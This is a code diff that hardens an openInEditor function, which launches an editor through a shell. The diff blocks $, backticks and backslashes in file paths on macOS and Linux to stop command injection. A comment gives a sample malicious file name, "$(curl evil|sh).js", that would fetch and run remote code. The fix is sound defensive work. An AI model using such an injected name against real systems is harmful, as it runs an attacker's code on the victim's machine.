@@ -45,7 +45,11 @@ export async function saveTextFile(window: BrowserWindow | null, defaultName: st
 // passed as a single quoted argument.
 export function openInEditor(editorCommand: string, projectRoot: string, path: string): void {
   const file = new Workspace(projectRoot).resolve(path);
-  if (/["\r\n]/.test(file)) throw new Error('Unsupported characters in file path.');
+  // The path is a single double-quoted argument. On macOS and Linux the shell still expands `$(...)`, `$VAR` and
+  // backticks inside double quotes (a file named "$(curl evil|sh).js" would run it), and a backslash could end the
+  // quotes; cmd.exe on Windows only expands %VAR% there, which runs nothing.
+  const unsafe = process.platform === 'win32' ? /["\r\n]/ : /["\r\n$`\\]/;
+  if (unsafe.test(file)) throw new Error('Unsupported characters in file path.');
   const command = editorCommand.trim() || 'code';
   const child = spawn(`${command} "${file}"`, { shell: true, detached: true, stdio: 'ignore', windowsHide: true });
   child.on('error', () => {});
